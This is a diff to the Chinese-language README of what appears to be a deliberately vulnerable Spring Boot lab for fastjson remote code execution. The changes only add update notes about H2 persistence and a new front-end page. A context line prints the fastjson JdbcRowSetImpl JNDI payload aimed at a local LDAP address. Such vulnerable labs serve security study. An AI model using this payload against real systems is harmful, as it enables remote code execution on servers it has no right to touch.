@@ -20,7 +20,8 @@ fastjson rce env based on springboot
 3. 发送利用payload：{"@type": "com.sun.rowset.JdbcRowSetImpl","dataSourceName": "ldap://127.0.0.1:10086/Object","autoCommit": true}
 
 ## update info
-通过H2 数据库，对数据做了持久化处理，可以保存提交的数据到服务端
+1. 通过H2 数据库，对数据做了持久化处理，可以保存提交的数据到服务端
+2. 增加了前端页面，可以通过按钮添加、删除、查询三国数据
 
 ## TODO
 - [ ] 分析漏洞源码
